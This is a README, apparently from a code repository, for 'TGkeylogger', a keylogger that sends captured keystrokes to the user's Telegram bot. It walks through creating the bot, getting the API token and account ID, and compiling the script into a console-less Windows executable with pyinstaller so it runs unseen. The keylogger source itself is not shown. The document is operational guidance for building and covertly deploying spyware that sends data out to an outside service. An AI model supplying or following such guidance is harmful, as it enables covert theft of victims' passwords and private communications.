# TGkeylogger
TGkeylogger – a keylogger that regularly sends captured data directly to your Telegram bot

=========================================================

First, create your bot via Telegram’s official BotFather: https://t.me/BotFather

Click /newbot.

Choose a bot name, then a username (e.g., mytest_bot).

After creation, copy your API token (to paste into your code later).

Next, visit the official bot https://t.me/getmyid_bot to find your account ID, which must also be added to the code.

After editing the file with your data, convert the .py file to .exe by running this command in CMD: pyinstaller --onefile --noconsole TGkeylogger.py
